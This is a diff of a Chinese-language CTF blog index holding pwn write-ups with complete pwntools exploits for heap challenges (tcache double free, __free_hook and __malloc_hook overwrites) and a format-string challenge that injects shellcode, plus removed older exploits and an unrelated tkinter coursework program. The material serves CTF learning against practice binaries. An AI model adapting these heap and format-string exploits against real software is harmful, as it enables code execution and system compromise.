+one = [0x45226, 0x4527a, 0xf03a4, 0xf1147]
+one_gadget=base+one[3]
+realloc=libc.sym[&#39;realloc&#39;]+base
+
+add(0x60,p64(malloc_hook-0x23),p64(malloc_hook-0x23))
+add(0x60,&#39;cccc&#39;,&#39;dddd&#39;)
+add(0x60,&#39;dddd&#39;,&#39;eeee&#39;)
+print(&#39;one_gadget=&#39;+hex(one_gadget)+&#39;   malloc-0x23=&#39;+hex(malloc_hook-0x23)+&#39;   realloc=&#39;+hex(realloc))
+
+payload=b&#39;a&#39;*(0x13-8)+p64(one_gadget)+p64(realloc+2)
+add(0x60,payload,&#39;cccc&#39;)
+debug()
+p.sendafter(&#39;Input your choice:&#39;,&#39;1&#39;)
+
+
+p.interactive()
+</code></pre>
+
+        
+
+
+        <span>
+          <a class="article-read" href="/2024/03/06/starctf-2019-girlfriend/"> Read more -->
+          </span>
+        </div>
+
+        
+    
+    <div class="recent-post-item">
+
+      <a href="/2024/03/05/ACTF-2019-message/" class="item-title">ACTF_2019_message</a>
+      
+      <time datetime="2024-03-05T11:24:11.000Z">
+        2024-03-05
+      </time>
+      
+      <!-- <div class="article-digest"> -->
+        <!-- 有uaf漏洞，但是打印的话会检查size，所以不能简单地uaf
+
+add(0x200,&#39;aaaa&#39;)
+add(0x200,&#39;aaaa&#39;)
+free(0)
+free(0)
+add(0x200,p64(0x60204c))
+add(0x200,&#39;aaaa&#39;)
+
+
+成功控制堆指针
+payload=p64(1)+p64(0)+b&#39;\x00&#39;*4+p64(0x200)+p64(0x60204c)+p64(0)*20
+
+add(0x200,payload)
+
+for i in range(8):
+    add(0x80,&#39;aaaa&#39;)
+
+#8
+for i in range(1,7):
+    free(i)
+free(8)
+
+
+add的大小是0x80，保证了满的时侯的那个bin放在unsorted bin，最后两个倒序释放，防止和top chunk合并free(7)
+
+堆7指针是main_arena+96
+
+我试了这种方法也可以show出来，不过edit的时候不能sendline，不然会覆盖掉一个字节，导致show的 -->
+        <!-- </div> -->
+
+        
+        <p>有uaf漏洞，但是打印的话会检查size，所以不能简单地uaf</p>
+<p><img src="https://i0.imgs.ovh/2024/03/04/OYMIU.png" alt="image-20240305192928168"></p>
+<pre><code class="lang-py">add(0x200,&#39;aaaa&#39;)
+add(0x200,&#39;aaaa&#39;)
+free(0)
+free(0)
+add(0x200,p64(0x60204c))
+add(0x200,&#39;aaaa&#39;)
+</code></pre>
+<p><img src="https://i0.imgs.ovh/2024/03/04/OYkHR.png" alt="image-20240305194658879"></p>
+<p>成功控制堆指针</p>
+<pre><code>payload=p64(1)+p64(0)+b&#39;\x00&#39;*4+p64(0x200)+p64(0x60204c)+p64(0)*20
+
+add(0x200,payload)
+</code></pre><p><img src="https://i0.imgs.ovh/2024/03/04/OYScj.png" alt="image-20240305201228735"></p>
+<pre><code class="lang-py">for i in range(8):
+    add(0x80,&#39;aaaa&#39;)
+
+#8
+for i in range(1,7):
+    free(i)
+free(8)
+</code></pre>
+<p><img src="https://i0.imgs.ovh/2024/03/04/OYQSJ.png" alt="image-20240305201734649"></p>
+<h5 id="add的大小是0x80，保证了满的时侯的那个bin放在unsorted-bin，最后两个倒序释放，防止和top-chunk合并"><a href="#add的大小是0x80，保证了满的时侯的那个bin放在unsorted-bin，最后两个倒序释放，防止和top-chunk合并" class="headerlink" title="add的大小是0x80，保证了满的时侯的那个bin放在unsorted bin，最后两个倒序释放，防止和top chunk合并"></a>add的大小是0x80，保证了满的时侯的那个bin放在unsorted bin，最后两个倒序释放，防止和top chunk合并</h5><pre><code class="lang-py">free(7)
+</code></pre>
+<p>堆7指针是main_arena+96</p>
+<p><img src="https://i0.imgs.ovh/2024/03/04/OYJC9.png" alt="image-20240305202521878"></p>
+<p>我试了这种方法也可以show出来，不过edit的时候不能sendline，不然会覆盖掉一个字节，导致show的地址出错</p>
+<pre><code class="lang-py">payload=p64(1)+p64(0)+b&#39;\x00&#39;*4+p64(0x200)+p64(0x60204c)+p64(0)*12+p64(0x80)
+edit(0,payload)
+
+show(7)
+</code></pre>
+<p>这里因为用sendline所以出错了</p>
+<p><img src="https://i0.imgs.ovh/2024/03/04/O875W.png" alt="image-20240305203854218"></p>
+<p>或者用师傅的做法，不过我的更简单</p>
+<pre><code class="lang-py">edit(0,payload)
+
+for i in range(7):
+    add(0x80,&#39;aaaa&#39;)
+add(0x8,&#39;aaaaaaa&#39;) #堆8，会在unsorted bin里拿
+show(8)
+</code></pre>
+<p><img src="https://i0.imgs.ovh/2024/03/05/QAzk0.png" alt="image-20240306185549924"></p>
+<pre><code class="lang-py">r.recvuntil(&#39;The message: aaaaaaa&#39;)
+main_arena=u64(r.recvuntil(&#39;\x7f&#39;)[-6:].ljust(8,b&#39;\x00&#39;))-224 #这里减0x80再减96
+#libc2.23和2.27都是__malloc_hook=main_arena-0x10
+print(&#39;main_&#39;+hex(main_arena))
+base=main_arena-0x10-libc.sym[&#39;__malloc_hook&#39;]
+</code></pre>
+<pre><code class="lang-py">payload=p64(1)+p64(0)+b&#39;\x00&#39;*4+p64(0x200)+p64(0x60204c)+p64(0x80)+p64(binsh)+p64(0x80)+p64(free_hook)
+
+edit(0,payload)
+
+edit(2,p64(system))
+</code></pre>
+<p><img src="https://i0.imgs.ovh/2024/03/05/QA4wm.png" alt="image-20240306190111092"></p>
+<p>最后有个地方就是free(1)会报错，得分开或者手动</p>
+<p>exp</p>
+<pre><code class="lang-python">from pwn import*
+from LibcSearcher import *
+#r=remote(&quot;node5.buuoj.cn&quot;,29647)
+r=process(&quot;./ACTF_2019_message&quot;)
+context.log_level=&quot;debug&quot;
+context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,os=&#39;linux&#39;)
+libc=ELF(&#39;./libc-2.27.so&#39;)
+elf=ELF(&#39;./ACTF_2019_message&#39;)
+
+def choice(nu):
+    r.sendlineafter(&#39;choice: &#39;, str(nu))
+
+def add(size,content):
+    choice(1)
+    r.sendlineafter(&#39;length of message:\n&#39;, str(size))
+    r.sendlineafter(&#39;input the message:\n&#39;, content)
+
+def free(idx):
+    choice(2)
+    r.sendlineafter(&#39;you want to delete:\n&#39;, str(idx))
+
+def edit(idx, content):
+    choice(3)
+    r.sendlineafter(&#39;you want to edit:\n&#39;, str(idx))
+    r.sendlineafter(&#39;edit the message:\n&#39;, content )
+
+def show(idx):
+    choice(4)
+    r.sendlineafter(&#39;want to display:\n&#39;, str(idx))
+
+add(0x200,&#39;aaaa&#39;) #0
+add(0x200,&#39;aaaa&#39;) #1
+free(0)
+free(0)
+add(0x200,p64(0x60204c))
+add(0x200,&#39;aaaa&#39;)
+
+payload=p64(1)+p64(0)+b&#39;\x00&#39;*4+p64(0x200)+p64(0x60204c)+p64(0)*20
+
+
+
+add(0x200,payload) #0
+
+
+for i in range(8):
+    add(0x80,&#39;aaaa&#39;)
+
+#8
+for i in range(1,7):
+    free(i)
+free(8) 
+free(7)
+
+edit(0,payload)
+
+for i in range(7):
+    add(0x80,&#39;aaaa&#39;)
+
+
+add(0x10,&#39;aaaaaaa&#39;)
+
+show(8)
+r.recvuntil(&#39;The message: aaaaaaa&#39;)
+main_arena=u64(r.recvuntil(&#39;\x7f&#39;)[-6:].ljust(8,b&#39;\x00&#39;))-224
+
+print(&#39;main_&#39;+hex(main_arena))
+base=main_arena-0x10-libc.sym[&#39;__malloc_hook&#39;]
+free_hook=base+libc.sym[&#39;__free_hook&#39;]
+system=base+libc.sym[&#39;system&#39;]
+binsh=base+ next(libc.search(b&#39;/bin/sh&#39;))
+print(hex(system))
+payload=p64(1)+p64(0)+b&#39;\x00&#39;*4+p64(0x200)+p64(0x60204c)+p64(0x80)+p64(binsh)+p64(0x80)+p64(free_hook)
+
+edit(0,payload)
+
+edit(2,p64(system))
+#gdb.attach(r)
+#sleep(1)
+r.sendlineafter(&#39;choice: &#39;,&#39;2&#39;)
+r.sendlineafter(&#39;you want to delete:\n&#39;,&#39;1&#39;)
+# 有时候得手动free(1),不然打不通，很离谱
+#free(1)
+
+r.interactive()
+</code></pre>
+
+        
+
+
+        <span>
+          <a class="article-read" href="/2024/03/05/ACTF-2019-message/"> Read more -->
+          </span>
+        </div>
+
+        
+    
+    <div class="recent-post-item">
+
+      <a href="/2024/03/02/ACTF-2019-OneRepeater/" class="item-title">ACTF_2019_OneRepeater</a>
+      
+      <time datetime="2024-03-02T08:13:15.000Z">
+        2024-03-02
+      </time>
+      
+      <!-- <div class="article-digest"> -->
+        <!-- 
+有可读可写可执行段，是道格式化字符串题，用shellcode做
+1输入，会打印变量的栈地址，2格式化，可多次格式化，返回地址得在原来的基础上加0x10，因为这里leave以后并没有立即ret,而是lea     esp, [ecx-4]，调试发现时是add esp, 0x10，所以ret_addr=0x408+0x10+4
+
+exp
+from pwn import*
+from LibcSearcher import *
+p=remote(&quot;node5.buuoj.cn&quot;,29221)
+#p=process(&quot;./ACTF_2019_OneRepeater&quot;)
+context.log_level=&quot;debug&quot;
+context(log_level=&#39;debug&#39;,arch=&#39;i386&#39;,os=&#39;linux&#39;)
+
+offset=16
+p.sendlineafter(&#39;Exit&#39;,&#39;1&#39;)
+p.recvline()
+addr = int(p.recv( -->
+        <!-- </div> -->
+
+        
+        <p><img src="https://i0.imgs.ovh/2024/03/01/78XMV.png" alt="image-20240302161950112"></p>
+<h5 id="有可读可写可执行段，是道格式化字符串题，用shellcode做"><a href="#有可读可写可执行段，是道格式化字符串题，用shellcode做" class="headerlink" title="有可读可写可执行段，是道格式化字符串题，用shellcode做"></a>有可读可写可执行段，是道格式化字符串题，用shellcode做</h5><p><img src="https://i0.imgs.ovh/2024/03/01/78V9I.png" alt="image-20240302162059697"></p>
+<p>1输入，会打印变量的栈地址，2格式化，可多次格式化，返回地址得在原来的基础上加0x10，因为这里leave以后并没有立即ret,而是lea     esp, [ecx-4]，调试发现时是add esp, 0x10，所以ret_addr=0x408+0x10+4</p>
+<p><img src="https://i0.imgs.ovh/2024/03/01/78xet.png" alt="image-20240302165416987"></p>
 <p>exp</p>
 <pre><code class="lang-py">from pwn import*
 from LibcSearcher import *
-#p=remote(&quot;node4.buuoj.cn&quot;,28022)
-p=process(&quot;./ciscn_2019_es_1&quot;)
+p=remote(&quot;node5.buuoj.cn&quot;,29221)
+#p=process(&quot;./ACTF_2019_OneRepeater&quot;)
 context.log_level=&quot;debug&quot;
-elf=ELF(&quot;./ciscn_2019_es_1&quot;)
-libc=ELF(&quot;./libc-2.27.so&quot;)
+context(log_level=&#39;debug&#39;,arch=&#39;i386&#39;,os=&#39;linux&#39;)
 
-def add(size,name):
-    p.recvuntil(&quot;choice:&quot;)
-    p.sendline(&quot;1&quot;)
-    p.recvuntil(&quot;name&quot;)
-    p.sendline(str(int(size)))
-    p.recvuntil(&quot;name:&quot;)
-    p.sendline(name)
-    p.recvuntil(&quot;call&quot;)
-    p.sendline(name)
+offset=16
+p.sendlineafter(&#39;Exit&#39;,&#39;1&#39;)
+p.recvline()
+addr = int(p.recv(8).strip(), 16)
+ret_addr=addr+0x418+4
+print(&#39;addr&#39;+hex(addr))
 
-def show(dex):
-    p.sendlineafter(&quot;choice:&quot;,&#39;2&#39;)
-    p.sendlineafter(&quot;index:&quot;,str(dex))  
+&#39;&#39;&#39;
+payload=p32(ret_addr)+b&#39;%&#39;+str(addr%65536-4).encode()+b&#39;c&#39;+b&#39;%16$hn&#39;
+p.sendline(payload)
+p.sendlineafter(&#39;3) Exit&#39;,&#39;2&#39;)
 
-def delete(dex):
-    p.sendlineafter(&quot;choice:&quot;,&#39;3&#39;)
-    p.sendlineafter(&quot;index:\n&quot;,str(dex)) 
-
-
-add(0x410,&quot;AAAA&quot;)
-add(0x20,&quot;AAAA&quot;)
-add(0x20,&quot;bin/sh&quot;)
-
-delete(0)
-show(0)
-
-malloc_hook_addr = u64(p.recvuntil(b&#39;\x7f&#39;)[-6:].ljust(8,b&#39;\x00&#39;))-96-0x10
-base_addr = malloc_hook_addr - libc.symbols[&#39;__malloc_hook&#39;]
-free_hook = base_addr + libc.symbols[&#39;__free_hook&#39;]
-system_addr = base_addr + libc.symbols[&#39;system&#39;]
-
-delete(1)
-
-delete(1)
-
-gdb.attach(p)
+p.sendlineafter(&#39;3) Exit&#39;,&#39;1&#39;)
+payload=p32(ret_addr+2)+b&#39;%&#39;+str(addr//65536-4).encode()+b&#39;c&#39;+b&#39;%16$hn&#39;
+p.sendline(payload)
+&#39;&#39;&#39;
+payload=p32(ret_addr)+p32(ret_addr+2)+b&#39;%&#39;+str(addr%65536-8).encode()+b&#39;c&#39;+b&#39;%16$hn&#39;+b&#39;%&#39;+str(addr//65536-addr%65536).encode()+b&#39;c%17$hn&#39;
+p.sendline(payload)
+p.sendlineafter(&#39;3) Exit&#39;,&#39;2&#39;)
+p.sendlineafter(&#39;3) Exit&#39;,&#39;1&#39;)
+#gdb.attach(p)
 sleep(1)
 
+p.sendline(asm(shellcraft.sh()))
 
-add(0x20,p64(free_hook))
-add(0x20,&#39;MMMM&#39;)
-
-add(0x20,p64(system_addr))
-delete(2)
-
-#p.sendline(payload)
+p.sendlineafter(&#39;3) Exit&#39;,&#39;3&#39;)
 
 
 p.interactive()
@@ -315,483 +735,7 @@ p.interactive()
 
 
         <span>
-          <a class="article-read" href="/2024/01/22/ciscn-2019-es-1/"> Read more -->
-          </span>
-        </div>
-
-        
-    
-    <div class="recent-post-item">
-
-      <a href="/2024/01/14/lctf2016_pwn200/" class="item-title">lctf2016_pwn200</a>
-      
-      <time datetime="2024-01-14T12:22:41.000Z">
-        2024-01-14
-      </time>
-      
-      <!-- <div class="article-digest"> -->
-        <!-- lctf2016_pwn200一道有点难的堆题这是主函数的结构，当我们输入满0x40时能够把主函数的ebp的地址泄露出来
-下面小a的末尾的rbp寄存器存着主函数的rbp
-后面还调用了两个函数，说明这两个函数的栈帧离得不远，而这个函数，可以构造我们的fakechunk,还有我们的shellcode
-shellcode第一个得是’\x00’防止复制过去，造成影响申请得到得堆的地址和给过去的不太一样，这是构造的栈的结构
-
-然后ptr指针的值被覆盖成栈上的，等我们free再malloc的时候就能申请到这，但是大小得是0x30，因为我们构造的fakechunk的大小是0x40的大小，这样才能malloc到我们的栈上，从而覆盖到返回地址，而返回地址得写成shellcode开始的地址。shellcode的结构应该写出这样的结构。
-payload=3*p64(0)+p64(rbp-0xc0+1)
-
-再次申请覆盖掉返回地址，最后程序返回的时候会执行shellcodefrom pwn import*
-from LibcSearcher import *
-#p=remote(&quot;node4.buuo -->
-        <!-- </div> -->
-
-        
-        <h3 id="lctf2016-pwn200"><a href="#lctf2016-pwn200" class="headerlink" title="lctf2016_pwn200"></a>lctf2016_pwn200</h3><h4 id="一道有点难的堆题"><a href="#一道有点难的堆题" class="headerlink" title="一道有点难的堆题"></a>一道有点难的堆题</h4><h4 id="这是主函数的结构，当我们输入满0x40时能够把主函数的ebp的地址泄露出来"><a href="#这是主函数的结构，当我们输入满0x40时能够把主函数的ebp的地址泄露出来" class="headerlink" title="这是主函数的结构，当我们输入满0x40时能够把主函数的ebp的地址泄露出来"></a>这是主函数的结构，当我们输入满0x40时能够把主函数的ebp的地址泄露出来</h4><p><img src="https://i0.imgs.ovh/2024/01/14/hZ3VW.png" alt="image-20240114222351986"></p>
-<h4 id="下面小a的末尾的rbp寄存器存着主函数的rbp"><a href="#下面小a的末尾的rbp寄存器存着主函数的rbp" class="headerlink" title="下面小a的末尾的rbp寄存器存着主函数的rbp"></a>下面小a的末尾的rbp寄存器存着主函数的rbp</h4><p><img src="https://i0.imgs.ovh/2024/01/14/hZfWv.png" alt="image-20240114222408532"></p>
-<h4 id="后面还调用了两个函数，说明这两个函数的栈帧离得不远，而这个函数，可以构造我们的fakechunk-还有我们的shellcode"><a href="#后面还调用了两个函数，说明这两个函数的栈帧离得不远，而这个函数，可以构造我们的fakechunk-还有我们的shellcode" class="headerlink" title="后面还调用了两个函数，说明这两个函数的栈帧离得不远，而这个函数，可以构造我们的fakechunk,还有我们的shellcode"></a>后面还调用了两个函数，说明这两个函数的栈帧离得不远，而这个函数，可以构造我们的fakechunk,还有我们的shellcode</h4><p><img src="https://i0.imgs.ovh/2024/01/14/hZmge.png" alt="image-20240114222423230"></p>
-<h4 id="shellcode第一个得是’-x00’防止复制过去，造成影响"><a href="#shellcode第一个得是’-x00’防止复制过去，造成影响" class="headerlink" title="shellcode第一个得是’\x00’防止复制过去，造成影响"></a>shellcode第一个得是’\x00’防止复制过去，造成影响</h4><h4 id="申请得到得堆的地址和给过去的不太一样，这是构造的栈的结构"><a href="#申请得到得堆的地址和给过去的不太一样，这是构造的栈的结构" class="headerlink" title="申请得到得堆的地址和给过去的不太一样，这是构造的栈的结构"></a>申请得到得堆的地址和给过去的不太一样，这是构造的栈的结构</h4><p><img src="https://i0.imgs.ovh/2024/01/14/hZ6N3.png" alt="image-20240114222437905"></p>
-<p><img src="https://i0.imgs.ovh/2024/01/14/hZkp9.png" alt="image-20240114222456777"></p>
-<h4 id="然后ptr指针的值被覆盖成栈上的，等我们free再malloc的时候就能申请到这，但是大小得是0x30，因为我们构造的fakechunk的大小是0x40的大小，这样才能malloc到我们的栈上，从而覆盖到返回地址，而返回地址得写成shellcode开始的地址。"><a href="#然后ptr指针的值被覆盖成栈上的，等我们free再malloc的时候就能申请到这，但是大小得是0x30，因为我们构造的fakechunk的大小是0x40的大小，这样才能malloc到我们的栈上，从而覆盖到返回地址，而返回地址得写成shellcode开始的地址。" class="headerlink" title="然后ptr指针的值被覆盖成栈上的，等我们free再malloc的时候就能申请到这，但是大小得是0x30，因为我们构造的fakechunk的大小是0x40的大小，这样才能malloc到我们的栈上，从而覆盖到返回地址，而返回地址得写成shellcode开始的地址。"></a>然后ptr指针的值被覆盖成栈上的，等我们free再malloc的时候就能申请到这，但是大小得是0x30，因为我们构造的fakechunk的大小是0x40的大小，这样才能malloc到我们的栈上，从而覆盖到返回地址，而返回地址得写成shellcode开始的地址。</h4><h4 id="shellcode的结构应该写出这样的结构。"><a href="#shellcode的结构应该写出这样的结构。" class="headerlink" title="shellcode的结构应该写出这样的结构。"></a>shellcode的结构应该写出这样的结构。</h4><p><img src="https://i0.imgs.ovh/2024/01/14/hZ07O.png" alt="image-20240114222514160"></p>
-<pre><code class="lang-py">payload=3*p64(0)+p64(rbp-0xc0+1)
-</code></pre>
-<h4 id="再次申请覆盖掉返回地址，最后程序返回的时候会执行shellcode"><a href="#再次申请覆盖掉返回地址，最后程序返回的时候会执行shellcode" class="headerlink" title="再次申请覆盖掉返回地址，最后程序返回的时候会执行shellcode"></a>再次申请覆盖掉返回地址，最后程序返回的时候会执行shellcode</h4><h4 id=""><a href="#" class="headerlink" title=""></a><img src="https://i0.imgs.ovh/2024/01/14/hZpiJ.png" alt="image-20231010144445729"></h4><pre><code class="lang-py">from pwn import*
-from LibcSearcher import *
-#p=remote(&quot;node4.buuoj.cn&quot;,28868)
-p=process(&quot;./pwn200&quot;)
-
-context.log_level=&quot;debug&quot;
-payload=&#39;a&#39;*0x30
-p.sendafter(&#39;u?&#39;,payload)
-p.recvuntil(&#39;a&#39;*0x30)
-rbp=u64(p.recv(6).ljust(8,&#39;\x00&#39;))
-print(hex(rbp))
-
-
-shellcode=&quot;\x00\x31\xf6\x48\xbb\x2f\x62\x69\x6e&quot;
-shellcode+= &quot;\x2f\x2f\x73\x68\x56\x53\x54\x5f&quot;
-shellcode += &quot;\x6a\x3b\x58\x31\xd2\x0f\x05&quot;
-
-payload=(shellcode+2*p64(0)+p64(0X41)).ljust(0x38,&#39;\x00&#39;)  #gouzhao fakebchunk
-payload+=p64(rbp-0x90)
-
-
-p.sendlineafter(&#39;id ~~?&#39;,&#39;31&#39;)
-
-print(hex(rbp-0x90))
-
-p.sendlineafter(&#39;money~&#39;,payload)
-
-p.sendlineafter(&#39;choice : &#39;,&#39;2&#39;)
-#p.recvuntil(&#39;\n&#39;)
-gdb.attach(p)
-sleep(1)
-p.sendlineafter(&#39;choice : &#39;,&#39;1&#39;)
-
-
-p.sendlineafter(&#39;long?&#39;,&#39;48&#39;)
-
-payload=3*p64(0)+p64(rbp-0xc0+1)
-
-p.sendlineafter(&#39;money : &#39;,payload)
-
-p.sendlineafter(&#39;choice : &#39;,&#39;3&#39;)
-
-#p.sendline(payload)
-
-p.interactive()
-</code></pre>
-
-        
-
-
-        <span>
-          <a class="article-read" href="/2024/01/14/lctf2016_pwn200/"> Read more -->
-          </span>
-        </div>
-
-        
-    
-    <div class="recent-post-item">
-
-      <a href="/2023/12/25/python%E8%AF%BE%E8%AE%BE/" class="item-title">python课设</a>
-      
-      <time datetime="2023-12-25T14:49:46.000Z">
-        2023-12-25
-      </time>
-      
-      <!-- <div class="article-digest"> -->
-        <!-- import tkinter as tk
-from tkinter import messagebox, simpledialog
-import json
-import re
-import os
-
-STUDENT_FILE = &#39;students.json&#39;
-
-def load_students():
-    if not os.path.exists(STUDENT_FILE):
-        return []
-
-    with open(STUDENT_FILE, &#39;r&#39;, encoding=&#39;utf-8&#39;) as file:
-        return json.load(file)
-
-def save_students(students):
-    with open(STUDENT_FILE, &#39;w&#39;, encoding=&#39;utf-8&#39;) as file:
-        json.dump(students, file, ensure_ascii=False, indent=2)
-
-de -->
-        <!-- </div> -->
-
-        
-        <pre><code class="lang-py">import tkinter as tk
-from tkinter import messagebox, simpledialog
-import json
-import re
-import os
-
-STUDENT_FILE = &#39;students.json&#39;
-
-def load_students():
-    if not os.path.exists(STUDENT_FILE):
-        return []
-
-    with open(STUDENT_FILE, &#39;r&#39;, encoding=&#39;utf-8&#39;) as file:
-        return json.load(file)
-
-def save_students(students):
-    with open(STUDENT_FILE, &#39;w&#39;, encoding=&#39;utf-8&#39;) as file:
-        json.dump(students, file, ensure_ascii=False, indent=2)
-
-def show_students(students):
-    sorted_students = sorted(students, key=lambda x: x[&#39;id&#39;])  # 按学号排序
-    students_text = &quot;&quot;
-    for student in sorted_students:
-        students_text += f&quot;学号: &#123;student[&#39;id&#39;]&#125;\n&quot;
-        students_text += f&quot;姓名: &#123;student[&#39;name&#39;]&#125;\n&quot;
-        students_text += f&quot;年龄: &#123;student[&#39;age&#39;]&#125;\n&quot;
-        students_text += f&quot;性别: &#123;student[&#39;gender&#39;]&#125;\n\n&quot;
-    return students_text
-
-def validate_id(student_id):
-    return bool(student_id.strip())
-
-def add_student(students):
-    dialog = tk.Toplevel()
-    dialog.title(&quot;添加学生信息&quot;)
-    dialog.geometry(&quot;250x200+900+400&quot;)
-    tk.Label(dialog, text=&quot;学号：&quot;).grid(row=0, column=0, padx=10, pady=5)
-    id_var = tk.StringVar()
-    tk.Entry(dialog, textvariable=id_var).grid(row=0, column=1, padx=10, pady=5)
-
-    tk.Label(dialog, text=&quot;姓名：&quot;).grid(row=1, column=0, padx=10, pady=5)
-    name_var = tk.StringVar()
-    tk.Entry(dialog, textvariable=name_var).grid(row=1, column=1, padx=10, pady=5)
-
-    tk.Label(dialog, text=&quot;年龄：&quot;).grid(row=2, column=0, padx=10, pady=5)
-    age_var = tk.StringVar()
-    tk.Entry(dialog, textvariable=age_var).grid(row=2, column=1, padx=10, pady=5)
-
-    tk.Label(dialog, text=&quot;性别：&quot;).grid(row=3, column=0, padx=10, pady=5)
-    gender_var = tk.StringVar()
-    gender_var.set(&quot;男&quot;)
-    gender_menu = tk.OptionMenu(dialog, gender_var, &quot;男&quot;, &quot;女&quot;)
-    gender_menu.grid(row=3, column=1, padx=10, pady=5)
-
-    def add_student_action():
-        student_info = &#123;
-            &#39;id&#39;: id_var.get(),
-            &#39;name&#39;: name_var.get(),
-            &#39;age&#39;: age_var.get(),
-            &#39;gender&#39;: gender_var.get()
-        &#125;
-
-        if not student_info[&#39;id&#39;] or not validate_id(student_info[&#39;id&#39;]):
-            messagebox.showerror(&quot;错误&quot;, &quot;学号格式错误，请重新输入。&quot;)
-            return
-
-        if any(student[&#39;id&#39;] == student_info[&#39;id&#39;] for student in students):
-            messagebox.showerror(&quot;错误&quot;, &quot;学号已存在，请重新输入。&quot;)
-            return
-
-        students.append(student_info)
-        messagebox.showinfo(&quot;成功&quot;, &quot;学生信息添加成功！&quot;)
-        dialog.destroy()
-
-    add_button = tk.Button(dialog, text=&quot;添加&quot;, command=add_student_action)
-    add_button.grid(row=4, columnspan=2, pady=10)
-
-def edit_student(students):
-    student_id = simpledialog.askstring(&quot;输入&quot;, &quot;请输入要编辑的学号：&quot;)
-    if not student_id or not validate_id(student_id):
-        messagebox.showerror(&quot;错误&quot;, &quot;学号格式错误，请重新输入。&quot;)
-        return
-
-    student = next((s for s in students if s[&#39;id&#39;] == student_id), None)
-    if student:
-        messagebox.showinfo(&quot;信息&quot;, f&quot;学号: &#123;student[&#39;id&#39;]&#125;\n姓名: &#123;student[&#39;name&#39;]&#125;\n年龄: &#123;student[&#39;age&#39;]&#125;\n性别: &#123;student[&#39;gender&#39;]&#125;&quot;)
-
-        dialog = tk.Toplevel()
-        dialog.title(&quot;编辑学生信息&quot;)
-        dialog.geometry(&quot;250x200+900+400&quot;)
-        tk.Label(dialog, text=&quot;姓名：&quot;).grid(row=1, column=0, padx=10, pady=5)
-        name_var = tk.StringVar(value=student[&#39;name&#39;])
-        tk.Entry(dialog, textvariable=name_var).grid(row=1, column=1, padx=10, pady=5)
-
-        tk.Label(dialog, text=&quot;年龄：&quot;).grid(row=2, column=0, padx=10, pady=5)
-        age_var = tk.StringVar(value=str(student[&#39;age&#39;]))
-        tk.Entry(dialog, textvariable=age_var).grid(row=2, column=1, padx=10, pady=5)
-
-        tk.Label(dialog, text=&quot;性别：&quot;).grid(row=3, column=0, padx=10, pady=5)
-        gender_var = tk.StringVar(value=student[&#39;gender&#39;])
-        gender_menu = tk.OptionMenu(dialog, gender_var, &quot;男&quot;, &quot;女&quot;)
-        gender_menu.grid(row=3, column=1, padx=10, pady=5)
-
-        def edit_student_action():
-            student[&#39;name&#39;] = name_var.get()
-            student[&#39;age&#39;] = int(age_var.get())
-            student[&#39;gender&#39;] = gender_var.get()
-            messagebox.showinfo(&quot;成功&quot;, &quot;学生信息编辑成功！&quot;)
-            dialog.destroy()
-
-        edit_button = tk.Button(dialog, text=&quot;编辑&quot;, command=edit_student_action)
-        edit_button.grid(row=4, columnspan=2, pady=10)
-    else:
-        messagebox.showerror(&quot;错误&quot;, &quot;未找到该学生信息。&quot;)
-
-def delete_student(students):
-    student_id = simpledialog.askstring(&quot;输入&quot;, &quot;请输入要删除的学号：&quot;)
-    if not student_id or not validate_id(student_id):
-        messagebox.showerror(&quot;错误&quot;, &quot;学号格式错误，请重新输入。&quot;)
-        return
-
-    student = next((s for s in students if s[&#39;id&#39;] == student_id), None)
-    if student:
-        students.remove(student)
-        messagebox.showinfo(&quot;成功&quot;, &quot;学生信息删除成功！&quot;)
-    else:
-        messagebox.showerror(&quot;错误&quot;, &quot;未找到该学生信息。&quot;)
-
-def main():
-    root = tk.Tk()
-    root.title(&quot;学生信息管理系统&quot;)
-
-    students = load_students()
-
-    window_width = 800
-    window_height = 500
-    screen_width = root.winfo_screenwidth()
-    screen_height = root.winfo_screenheight()
-
-    x_position = (screen_width - window_width) // 2
-    y_position = (screen_height - window_height) // 2
-
-    root.geometry(f&quot;&#123;window_width&#125;x&#123;window_height&#125;+&#123;x_position&#125;+&#123;y_position&#125;&quot;)
-
-    def show_students_command():
-        students_text = show_students(students)
-        messagebox.showinfo(&quot;学生信息&quot;, students_text)
-
-    def add_student_command():
-        add_student(students)
-
-    def delete_student_command():
-        delete_student(students)
-
-    def edit_student_command():
-        edit_student(students)
-
-    def save_and_exit():
-        save_students(students)
-        root.destroy()
-
-    show_students_button = tk.Button(root, text=&quot;显示所有学生信息&quot;, command=show_students_command)
-    show_students_button.pack()
-
-    add_student_button = tk.Button(root, text=&quot;添加学生信息&quot;, command=add_student_command)
-    add_student_button.pack()
-
-    delete_student_button = tk.Button(root, text=&quot;删除学生信息&quot;, command=delete_student_command)
-    delete_student_button.pack()
-
-    edit_student_button = tk.Button(root, text=&quot;编辑学生信息&quot;, command=edit_student_command)
-    edit_student_button.pack()
-
-    exit_button = tk.Button(root, text=&quot;保存并退出&quot;, command=save_and_exit)
-    exit_button.pack()
-
-    root.mainloop()
-
-if __name__ == &quot;__main__&quot;:
-    main()
-</code></pre>
-
-        
-
-
-        <span>
-          <a class="article-read" href="/2023/12/25/python课设/"> Read more -->
-          </span>
-        </div>
-
-        
-    
-    <div class="recent-post-item">
-
-      <a href="/2023/12/06/sctf2019-easy-heap/" class="item-title">sctf2019_easy_heap</a>
-      
-      <time datetime="2023-12-06T13:15:49.000Z">
-        2023-12-06
-      </time>
-      
-      <!-- <div class="article-digest"> -->
-        <!-- 例行检查，保护全开调用了mmap函数，把0xFFFFFFF000的地址映射到内存中某个地址，并打印出来，很明显这道题得用shellcode来做，这个地址可读可写可运行，后面要用
-add函数,会打印出堆的地址
-full函数，能输入内容到堆上
-最后会增添一个’\x00’,存在off by one 漏洞
-free函数，没什么漏洞
-先接收mmap映射的地址p.recvuntil(b&#39;Mmap: &#39;)
-vmap = p.recvline().strip()
-vmap = int(vmap, 16)
-print(&#39;vmap=&gt;&#39;+hex(vmap))
-
-做off-by-one这种题的话，有个技巧，一般都是先申请四个堆add(0x410) #0
-add(0x68) #1
-add(0x4f0) #2
-add(0x68) #3
-
-然后释放第一个，然后填充第一个堆，利用sub_E2D函数的输入把堆2的size位改为0，然后释放堆2进行unlink操作，然后堆1会被夹在中间free(0)
-payload=p64(0)*12+p64(0x490)
-fill(1,paylo -->
-        <!-- </div> -->
-
-        
